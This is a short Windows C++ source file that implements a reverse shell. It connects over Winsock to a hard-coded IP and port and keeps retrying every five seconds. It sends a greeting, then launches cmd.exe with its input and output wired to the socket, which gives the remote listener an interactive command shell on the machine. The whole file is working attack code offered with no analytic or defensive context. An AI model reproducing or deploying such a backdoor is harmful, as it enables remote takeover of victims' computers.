#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define IP "127.0.0.1"
#define PORT 80

int main(int argc, char* argv[])
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	const char* message;
	char server_reply[2000];
	int recv_size;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;



	//Initialising Winsock...
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	//Create a socket
	if ((s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	//set server's infos
	inet_pton(AF_INET, IP, (PVOID*)&server.sin_addr.s_addr);			//set ip
	server.sin_family = AF_INET;										//set family
	server.sin_port = htons(PORT);										//set port

	
	//Connect to remote server
	while (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		Sleep(5000);
	}


	//Send hello to the server
	message = "\nHello world ! \n\n";
	if (send(s, message, (int)strlen(message), 0) < 0)
	{
		puts("Send failed");
		return 1;
	}
	

	//Send shell to the server
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)s;
	si.hStdOutput = (HANDLE)s;
	si.hStdError = (HANDLE)s;
	
	CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
	
	return 0;
}
